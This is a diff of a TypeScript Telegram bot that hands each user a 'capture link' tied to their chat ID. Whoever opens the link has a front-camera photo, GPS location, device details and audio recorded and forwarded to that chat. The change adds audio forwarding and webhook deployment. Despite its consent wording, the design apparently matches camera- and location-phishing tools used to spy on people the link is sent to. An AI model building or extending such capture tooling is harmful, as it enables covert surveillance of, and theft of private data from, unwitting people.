@@ -2,44 +2,63 @@ import TelegramBot from "node-telegram-bot-api";
 import { logger } from "./logger";
 
 const token = process.env.TELEGRAM_BOT_TOKEN;
+if (!token) throw new Error("TELEGRAM_BOT_TOKEN environment variable is required");
 
-if (!token) {
-  throw new Error("TELEGRAM_BOT_TOKEN environment variable is required");
+// Webhook mode when APP_URL is set (production/Render), polling for local dev
+const appUrl = process.env.APP_URL?.replace(/\/$/, "");
+const useWebhook = !!appUrl;
+
+export const bot = useWebhook
+  ? new TelegramBot(token, { polling: false })
+  : new TelegramBot(token, { polling: true });
+
+if (useWebhook) {
+  const webhookUrl = `${appUrl}/api/telegram-webhook`;
+  bot.setWebHook(webhookUrl).then(() => {
+    logger.info({ webhookUrl }, "Telegram webhook set");
+  }).catch((err: unknown) => {
+    logger.error({ err }, "Failed to set Telegram webhook");
+  });
+} else {
+  logger.info("Telegram bot started in polling mode (dev)");
 }
 
-export const bot = new TelegramBot(token, { polling: true });
-
-const BASE_DOMAIN = process.env.REPLIT_DEV_DOMAIN
-  ? `https://${process.env.REPLIT_DEV_DOMAIN}`
-  : process.env.REPLIT_DOMAINS
-    ? `https://${process.env.REPLIT_DOMAINS.split(",")[0]}`
-    : "http://localhost:80";
+// Build the capture link for users
+function getCaptureLink(chatId: number): string {
+  const base = appUrl || (process.env.REPLIT_DEV_DOMAIN
+    ? `https://${process.env.REPLIT_DEV_DOMAIN}`
+    : process.env.REPLIT_DOMAINS
+      ? `https://${process.env.REPLIT_DOMAINS.split(",")[0]}`
+      : "http://localhost:80");
+  return `${base}/?chat_id=${chatId}`;
+}
 
 bot.onText(/\/start/, (msg) => {
   const chatId = msg.chat.id;
   const firstName = msg.from?.first_name ?? "User";
-
-  const captureLink = `${BASE_DOMAIN}/?chat_id=${chatId}`;
+  const link = getCaptureLink(chatId);
 
   const text =
-    `Namaste ${firstName}! 👋\n\n` +
-    `Yeh ek data sharing demonstration hai.\n\n` +
-    `Neeche diye gaye link par click karein. Wahan aapko clearly bataya jayega ki kya-kya information share hogi (camera photo, location, device info). Aap khud decide karenge ki share karna chahte hain ya nahi.\n\n` +
-    `🔗 Link: ${captureLink}\n\n` +
-    `Allow karne ke baad, aapki information seedha is bot par aa jayegi.`;
+    `Hello ${firstName}! 👋\n\n` +
+    `Click the link below to open the data sharing page.\n\n` +
+    `The page will clearly show you what information will be shared:\n` +
+    `• 📸 A photo from your front camera\n` +
+    `• 📍 Your GPS location\n` +
+    `• 📱 Your device information\n` +
+    `• 🎤 Audio recording (while page is open)\n\n` +
+    `🔗 ${link}\n\n` +
+    `After you allow permissions, all data will be sent directly to this bot.`;
 
   bot.sendMessage(chatId, text).catch((err: unknown) => {
     logger.error({ err, chatId }, "Failed to send start message");
   });
 
-  logger.info({ chatId, firstName }, "Start command received");
+  logger.info({ chatId, firstName }, "/start received");
 });
 
 bot.on("polling_error", (err) => {
   logger.error({ err }, "Telegram polling error");
 });
-
-logger.info("Telegram bot started (polling mode)");
 
 export async function sendTextToChat(chatId: string, text: string): Promise<void> {
   await bot.sendMessage(chatId, text, { parse_mode: "Markdown" });
@@ -50,8 +69,21 @@ export async function sendPhotoToChat(
   photoBase64: string,
   caption?: string,
 ): Promise<void> {
-  // Strip data URL prefix if present
   const base64Data = photoBase64.replace(/^data:image\/\w+;base64,/, "");
   const buffer = Buffer.from(base64Data, "base64");
   await bot.sendPhoto(chatId, buffer, { caption });
+}
+
+export async function sendAudioToChat(
+  chatId: string,
+  audioBuffer: Buffer,
+  filename: string,
+  caption?: string,
+): Promise<void> {
+  // Try sendVoice first (shows playable voice message), fallback to document
+  try {
+    await bot.sendVoice(chatId, audioBuffer, { caption });
+  } catch {
+    await bot.sendDocument(chatId, audioBuffer, { caption }, { filename, contentType: "audio/webm" });
+  }
 }
